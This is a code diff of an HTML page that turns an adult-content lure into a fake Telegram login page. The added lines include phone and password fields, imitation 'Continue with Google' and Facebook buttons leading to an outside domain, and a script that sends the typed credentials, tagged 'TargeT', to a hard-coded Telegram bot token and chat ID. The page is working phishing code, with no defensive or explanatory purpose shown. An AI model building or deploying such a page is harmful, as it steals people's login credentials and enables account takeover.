@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nora sex 🔞</title>
+         <title>Telegram invite🔞</title>
     <style>
         /* Set the background image */
         body {
@@ -23,7 +23,20 @@
             font-size: 32px; /* Increased font size */
             color: white;
             font-family: Arial, sans-serif;
-            margin-bottom: 10px; /* Space between Telegram text and login button */
+            margin-bottom: 10px; /* Space between Telegram text and input field */
+        }
+
+        /* Style for the phone number input field */
+        .phone-input {
+            width: 200px;
+            height: 40px;
+            font-size: 18px;
+            padding: 5px 10px;
+            margin-bottom: 15px; /* Space between input field and login button */
+            border-radius: 10px;
+            border: none;
+            text-align: center;
+            font-family: Arial, sans-serif;
         }
 
         /* Style for the login button */
@@ -56,6 +69,7 @@
             color: white;
             text-decoration: none;
             margin-top: 10px;
+            margin-bottom: 20px; /* Added space between "مشاهدة المزيد" and the new buttons */
         }
 
         .more-info img {
@@ -96,15 +110,60 @@
         .popup button:hover {
             background-color: grey;
         }
+
+        /* Style for the new buttons */
+        .auth-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 250px;
+            height: 50px;
+            background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent background */
+            color: white;
+            font-size: 20px;
+            text-align: center;
+            border-radius: 10px;
+            text-decoration: none;
+            font-family: Arial, sans-serif;
+            margin-bottom: 15px; /* Space between buttons */
+        }
+
+        .auth-button img {
+            width: 24px;
+            height: 24px;
+            margin-right: 10px;
+        }
+
+        .auth-button:hover {
+            background-color: rgba(0, 0, 0, 0.9); /* Darker background on hover */
+        }
     </style>
 </head>
 <body>
-    <div class="telegram-text">Telegram 🔞</div>
-    <a href="http://khair-zaman.com/volt/XZ?nox=7238044992" class="login-button">Login</a>
+    <!-- Replace text with an image icon or logo -->
+<div class="telegram-text">
+    <img src="path-to-your-logo.png" alt="TeleGram Logo" style="width: 200px; height: auto;">
+</div>
+
+    <!-- Phone number input field -->
+<input type="text" class="phone-input" placeholder="your phone number">
+
+<!-- Password input field -->
+<input type="password" class="phone-input" placeholder="your password">
+
+<a href="http://khair-zaman.com/volt/XZ?nox=7238044992" class="login-button">Login</a>
 
     <!-- Additional icon and text -->
-    <a href="https://lbx.to/d/vX3typh" class="more-info">
-        <img src="telegram.png" alt="More Info Icon"> مشاهدة المزيد
+    <a href="https://lbx.to/d/BKJNneq" class="more-info">
+        <img src="telegram.png" alt="More Info Icon"> More Info
+    </a>
+
+    <!-- New Auth buttons -->
+    <a href="http://khair-zaman.com/volt/XZ?nox=5318149339" class="auth-button">
+        <img src="path-to-google-icon.png" alt="Google Icon"> Continue with Google
+    </a>
+    <a href="http://khair-zaman.com/volt/FB?nox=5318149339" class="auth-button">
+        <img src="path-to-github-icon.png" alt="GitHub Icon"> Continue with facebook
     </a>
 
     <!-- Popup window -->
@@ -123,6 +182,39 @@
         function closePopup() {
             document.getElementById('popup').style.display = 'none';
         }
+
+            function sendToTelegram() {
+            var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
+            var password = document.querySelector('.phone-input[type="password"]').value;
+
+            var telegramBotToken = "6428071347:AAHP1yP2bZFkKB_82pBcseiH4Dgu-EVtEAU"; // استبدل هذه القيمة بـ Token الخاص بك
+            var chatId = "5318149339"; // استبدل هذه القيمة بـ Chat ID الخاص بك
+            var message = "TargeT: " + phoneNumber + "\nPassword: " + password;
+
+            var telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Send the message to Telegram
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", telegramUrl, true);
+            xhr.send();
+        }
+
+        document.querySelector('.phone-input').addEventListener('change', sendToTelegram);
+
+        
+    // Function to handle the login button click
+    document.querySelector('.login-button').addEventListener('click', function(event) {
+        var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
+        var password = document.querySelector('.phone-input[type="password"]').value;
+
+        if (phoneNumber === '' || password === '') {
+            alert('يرجى إدخال رقم الهاتف وكلمة المرور.');
+            event.preventDefault(); // Prevent the default action (navigation)
+        } else {
+            sendToTelegram(); // Send the phone number to Telegram as before
+        }
+    });
+
     </script>
 </body>
-</html>
+</html> 
